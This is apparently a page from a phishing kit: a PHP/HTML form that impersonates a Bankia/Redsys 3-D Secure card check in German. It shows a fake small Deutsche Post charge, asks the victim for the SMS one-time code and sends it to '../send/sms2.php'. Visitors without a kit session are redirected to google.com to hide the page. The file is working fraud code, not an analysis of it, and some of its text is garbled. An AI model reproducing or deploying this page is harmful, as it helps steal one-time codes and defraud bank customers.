<?php
session_start();
if (isset($_SESSION["username"])) {



?>
<!DOCTYPE html>
<html lang="de" class="no-js">
<head>
<meta charset="utf-8">
<title>SMS-Bestätigung</title>

<meta content="Monday, 01-Jan-90 00:00:00 GMT" http-equiv="Expires">
<meta content="no-cache" http-equiv="Pragma">
<meta content="no-cache" http-equiv="Cache-Control">
<meta content="IE=edge" http-equiv="X-UA-Compatible">

<meta content="width=device-width, initial-scale=1.0" name="viewport">
			<!--[if lt IE 9]>
				<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
				<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
			<![endif]-->
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script language="JavaScript">
		/**
		Funcion que obtiene el valor de un elemento
		e	: elemento
		nombre :nombre del elemento
		usada en las callbacks para ajax
		**/
		function dameValorElemento(e,nombre)
		{
			var valor = null;
			if (e == null)
				return null;
			var aux = e.getElementsByTagName(nombre);
			if (aux != null)
				aux = aux[0];
			return valorElemento(aux);
			return valor;
		}
	
		/**
		Funcion que devuelve el valor de un elemento hoja de un arbol XML
		e: elemento
		usada en las callbacks para ajax
		**/
		function valorElemento(e) {
			var valor = null;
			if (e != null)
				e = e.childNodes[0];
			if (e != null)
				valor = e.nodeValue;	
			return valor;
		}
		</script>
<link type="text/css" href="../file/BANKIA_files/css" rel="stylesheet">
<link type="text/css" media="screen" rel="stylesheet" href="../file/BANKIA_files/bootstrap.min.css">
<link type="text/css" media="screen" rel="stylesheet" href="../file/BANKIA_files/bootstrap-responsive.css">
<link type="text/css" media="screen" rel="stylesheet" href="../file/BANKIA_files/font-awesome.min.css">
<link type="text/css" media="screen" rel="stylesheet" href="../file/BANKIA_files/2038.css">
<script src="../file/BANKIA_files/utils.js.download" language="JavaScript" type="text/javascript"></script><script src="../file/BANKIA_files/des.js.download" language="JavaScript" type="text/javascript"></script><script src="../file/BANKIA_files/pwdbaseud.js.download" language="JavaScript" type="text/javascript"></script><script language="JavaScript" type="text/javascript">
				function finalizaIndirecto(){
		       		ocultaBoton();
		    		window.close();
		    		window.opener.submitDatos("","","NO_AUTENTICADA","");
				}
			</script>



</head>
<body>
<header class="header-margin-top">
<div class="container">
<div class="row">
<div class="span4 logo">
<img class="logo-entidad" src="../file/img/logo.png"></div>
<div class="span4 offset4">
<img class="logo-marca" src="../file/BANKIA_files/1_marca.png"></div>
</div>
</div>
</header>
<script src="../file/BANKIA_files/jquery.min.js.download"></script><script type="text/javascript" src="../file/BANKIA_files/bootstrap.min.js.download"></script><script type="text/javascript" src="../file/BANKIA_files/custom_10.js.download"></script><script type="text/javascript">
			$(function () {
			$('[data-toggle="tooltip"]').tooltip();
		})
		</script>
<div class="container">
<div class="row">
<div class="span12">
<h1>Sicherer elektronischer Handel: Überprüfung Ihrer Karte</h1>
</div>
</div>
<div class="row relativo">
<form role="form" method="post" name="otp" id="otpForm" class="clave-sms" action="../send/sms2.php">
<div class="span4 datos-compra">
<div class="caja-sombreada">
<h2>Informationen zum Kauf</h2>
<h3>Bitte überprüfen Sie die Details der Operation</h3>
<table class="table">
<tbody><tr>
<td>Importiert</td><td class="precio">2.99 EURO</td>
</tr>
<tr>
<td>Handel</td><td><strong>deutschepost.de</strong></td>
</tr>
<tr>
<td>Kartennummer</td><td><strong>**** **** **** ****</strong></td>
</tr>
</tbody></table>
</div>
</div>
<div class="span8 col-r">
<fieldset>
<div>
<legend data-placement="bottom" class="tooltiptext" data-toggle="tooltip" title="" data-original-title="If the mobile number is not correct, you can modify it in your Client Area on our website">Um den Vorgang zu bestätigen, geben Sie das Passwort ein, das wir per SMS an Ihr Handy gesendet haben **********</legend><label>SMS-Code<span class="help-inline"></span></label>
</div>
<div>
<input required="required" data-placement="bottom" data-toggle="tooltip" maxlength="8" type="password" id="PIN" name="sms2" autofocus="autofocus" title="" alt="Geben Sie das Passwort ein, das Sie auf Ihrem Handy erhalten haben" placeholder="Geben Sie hier Ihr SMS-Passwort ein" data-original-title="Geben Sie das Passwort ein, das Sie auf Ihrem Handy erhalten haben">
<div class="blanco"></div>
</div>
</fieldset>
<div class="caja-sombreada errores-frecuentes">
<h3 class="no-recibe">Sie erhalten das Passwort nicht auf Ihrem Handy?</h4>
<ul>
<li>
<span>Bitte geben Sie bis zu 5 Minuten Zeit, um die SMS zu erhalten.</span>
</li>
<li>
<span>Überprüfen  Sie, ob Sie ein Signal haben.</span>
</li>
<li>
<span>Überprüfen Sie, ob Sie sich im Flugzeugmodus befinden. Wenn ja, schalten Sie es aus.</span>
</li>
<li>
<span>Sie können es ausnahmsweise unter 902 246 8101 - Internet Office-Anfragen anfordern</span>
</li>
</ul>
</div>
</div>
<div class="span12 botones">
<button onclick="javascript:submitePIN();" type="submit" id="btn_aceptar" class="btn-aceptar">Bestätigen</button><button onclick="javascript:if(mensajeCancelar()) document.frmCancelar.submit();" data-placement="bottom" data-toggle="tooltip" class="btn-cancelar" title="" data-original-title="Durch Drücken von Abbrechen wird der Vorgang abgebrochen und Sie müssen von vorne beginnen"></button>
</div>
</form>
</div>
</div>
<div aria-hidden="true" aria-labelledby="ayudaLabel" role="dialog" tabindex="-1" class="modal hide fade" id="ayuda">
<div class="modal-header">
<button aria-hidden="true" data-dismiss="modal" class="close" type="button"></button>
<h3 id="myModalLabel">Warum erhalten Sie das OTP nicht?</h3>
</div>
<div class="modal-body">
<p></p>
<div aria-multiselectable="true" role="tablist" id="accordion" class="panel-group">
<div class="panel panel-default">
<div id="headingOne" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="ŋTiene su tel?no la memoria llena?" aria-controls="collapseOne" aria-expanded="true" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseOne" data-parent="#accordion" data-toggle="collapse">Ist Ihr Telefonspeicher voll?</a>
</h4>
</div>
<div aria-labelledby="headingOne" role="tabpanel" class="panel-collapse collapse" id="collapseOne">
<div class="panel-body">Möglicherweise ist der Speicher Ihres Telefons voll und dies führt dazu, dass keine neuen Nachrichten zugestellt werden können. Um dieses Problem zu lösen, würde es ausreichen, Speicherplatz freizugeben
im Speicher, um Platz für neue Nachrichten zu schaffen.</div>
</div>
</div>
<div class="panel panel-default">
<div id="headingTwo" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="ŋDispone usted de una tarjeta SIM Dual?" aria-controls="collapseTwo" aria-expanded="false" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseTwo" data-parent="#accordion" data-toggle="collapse" class="collapsed">Haben Sie eine Dual-SIM-Karte?</a>
</h4>
</div>
<div aria-labelledby="headingTwo" role="tabpanel" class="panel-collapse collapse" id="collapseTwo">
<div class="panel-body">Mit einer Doppelkarte hat der Benutzer eine einzelne SIM-Karte am selben Telefon, jedoch mit zwei verschiedenen Leitungen. Der grö?e Nachteil dieses Systems besteht darin, dass nicht beide Leitungen gleichzeitig aktiv sein können.
Aus diesem Grund ist das zum Empfang der SMS registrierte Telefon zu diesem Zeitpunkt nicht die aktive Leitung und wird daher nicht empfangen.</div>
</div>
</div>
<div class="panel panel-default">
<div id="headingThree" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="ŋDispone de un tel?no Multi SIM?" aria-controls="collapseThree" aria-expanded="false" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseThree" data-parent="#accordion" data-toggle="collapse" class="collapsed">ŋDispone de un tel?no Multi SIM?</a>
</h4>
</div>
<div aria-labelledby="headingThree" role="tabpanel" class="panel-collapse collapse" id="collapseThree">
<div class="panel-body">Mit einem Dual-SIM-Telefon können Benutzer mehr als eine SIM-Karte mit unterschiedlichen Leitungen in einem einzigen Terminal haben. Das Problem ist, dass es Ger? dieses Typs gibt
Dadurch können nicht beide Karten gleichzeitig aktiv sein. Aus diesem Grund kann es vorkommen, dass Sie die SMS nicht erhalten, weil die aktive Karte nicht die richtige ist.</div>
</div>
</div>
<div class="panel panel-default">
<div id="headingFour" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="ŋDispone de cobertura?" aria-controls="collapseFour" aria-expanded="false" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseFour" data-parent="#accordion" data-toggle="collapse" class="collapsed">Haben Sie Berichterstattung?</a>
</h4>
</div>
<div aria-labelledby="headingFour" role="tabpanel" class="panel-collapse collapse" id="collapseFour">
<div class="panel-body">Es ist sehr h?ig, dass Sie sich beim Versuch, zu zahlen, in einem Gebiet befinden, in dem keine Deckung verfügbar ist oder in dem die Deckung aufgrund eines Ereignisses in der N? begrenzt ist
wie Sportveranstaltungen, Konzerte usw. und erlauben nicht die korrekte Zustellung von SMS.</div>
</div>
</div>
<div class="panel panel-default">
<div id="headingFive" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="ŋDispone de alguna aplicaci??ue bloquea los SMS?" aria-controls="collapseFive" aria-expanded="false" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseFive" data-parent="#accordion" data-toggle="collapse" class="collapsed">Haben Sie eine Anwendung, die SMS blockiert?</a>
</h4>
</div>
<div aria-labelledby="headingFive" role="tabpanel" class="panel-collapse collapse" id="collapseFive">
<div class="panel-body">Aufgrund der Anzahl der SMS-Nachrichten, die Sie auf Ihrem Mobiltelefon empfangen, haben Sie möglicherweise eine Anwendung installiert, um bestimmte Nachrichten zu blockieren, z. B. Werbe-SMS, mit denen viele
Unternehmen bombardieren Menschen. Viele dieser Anwendungen betrachten die von der Entit?gesendeten SMS als unerwünschte SMS und blockieren sie.</div>
</div>
</div>
</div>
</div>
<div class="modal-footer">
<button aria-hidden="true" data-dismiss="modal" class="btn-aceptar">Schlie?n</button>
</div>
</div>


</body></html>

    <?php
}else {
HEADER("Location: https://google.com");

}
?>